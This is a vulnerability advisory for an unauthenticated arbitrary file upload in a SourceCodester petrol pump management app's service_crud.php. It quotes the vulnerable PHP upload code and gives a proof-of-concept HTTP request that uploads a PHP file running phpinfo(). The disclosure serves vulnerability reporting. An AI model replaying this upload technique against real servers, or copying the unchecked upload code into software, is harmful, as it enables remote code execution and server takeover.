# SOURCECODESTER / Petrol pump management software - service_crud.php Unauthenticated Arbitrary File Upload

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

## Affected Component
> /admin/app/service_crud.php

## Code
```php
   if (isset($_POST['submit'])) {

     // Author Name: Mayuri K. 
// for any PHP, Codeignitor, Laravel OR Python work contact me at mayuri.infospace@gmail.com  
// Visit website : www.mayurik.com
        $filepath = "../../assets/images/" . htmlspecialchars($_FILES["photo"]["name"]);

        if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
            var_dump(1);
            //echo "<img src=".$filepath." height=200 width=300 />";
            $img = htmlspecialchars($_FILES["photo"]["name"]);
        } else {
            echo "Error !!";
        }

        $filepath = "../../assets/images/" . htmlspecialchars($_FILES["banner"]["name"]);

        if (move_uploaded_file($_FILES["banner"]["tmp_name"], $filepath)) {
            //echo "<img src=".$filepath." height=200 width=300 />";
            $img1 = htmlspecialchars($_FILES["banner"]["name"]);
        } else {
            echo "Error !!";
        }


        $stmt = $conn->prepare("INSERT INTO `service`(`heading`, `shortcontent`, `content`,`photo`, `banner`,`metatitle`,`metadescription`,`keywords`,`robots`) VALUES (?,?,?,?,?,?,?,?,?)");

        $stmt->execute([htmlspecialchars($_POST['heading']), htmlspecialchars($_POST['shortcontent']), htmlspecialchars($_POST['content']), $img, $img1, htmlspecialchars($_POST['metatitle']), htmlspecialchars($_POST['metadescription']), htmlspecialchars($_POST['keywords']), htmlspecialchars($_POST['robots'])]);



        $_SESSION['success'] = "success";

        header("location:../manage_manufacturer.php");
    }



    if (isset($_POST['update'])) {

        if ($_FILES['photo']['tmp_name'] != '') {
            $file_extension = pathinfo($_FILES["photo"]["name"], PATHINFO_EXTENSION);
            $new_filename = uniqid() . '.' . $file_extension;
            $filepath = "../../assets/images/" . $new_filename;

            if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
                $img = $new_filename;

                @unlink("../../assets/images/" . htmlspecialchars($_POST['old_photo_img']));
            }
        } else {
            $img = htmlspecialchars($_POST['old_photo_img']);
        }
     // Author Name: Mayuri K. 
// for any PHP, Codeignitor, Laravel OR Python work contact me at mayuri.infospace@gmail.com  
// Visit website : www.mayurik.com
        if ($_FILES['banner']['tmp_name'] != '') {
            $file_extension = pathinfo($_FILES["banner"]["name"], PATHINFO_EXTENSION);
            $new_filename = uniqid() . '.' . $file_extension;
            $filepath = "../../assets/images/" . $new_filename;

            if (move_uploaded_file($_FILES["banner"]["tmp_name"], $filepath)) {
                $img1 = $new_filename;

                @unlink("../../assets/images/" . htmlspecialchars($_POST['old_banner_img']));
            }
        } else {
            $img1 = htmlspecialchars($_POST['old_banner_img']);
        }

        $stmt = $conn->prepare("UPDATE `service` SET `heading`=?,`shortcontent`=?,`content`=?,`photo`=?,`banner`=?,`metatitle`=?,`metadescription`=?, `keywords`=?, `robots`=? WHERE id=? ");

        $stmt->execute([htmlspecialchars($_POST['heading']), htmlspecialchars($_POST['shortcontent']), htmlspecialchars($_POST['content']), $img, $img1, htmlspecialchars($_POST['metatitle']), htmlspecialchars($_POST['metadescription']), htmlspecialchars($_POST['keywords']), htmlspecialchars($_POST['robots']), htmlspecialchars($_POST['id'])]);
        $_SESSION['update'] = "update";
        header("location:../manage_manufacturer.php");
    }
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/app/service_crud.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycF8LWYF3XessE4is
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 315

------WebKitFormBoundarycF8LWYF3XessE4is
Content-Disposition: form-data; name="photo"; filename="nochizplz1.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

------WebKitFormBoundarycF8LWYF3XessE4is
Content-Disposition: form-data; name="submit"


------WebKitFormBoundarycF8LWYF3XessE4is--
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/352833b2-3e1d-4caf-bacb-e9c2323fb7fa)
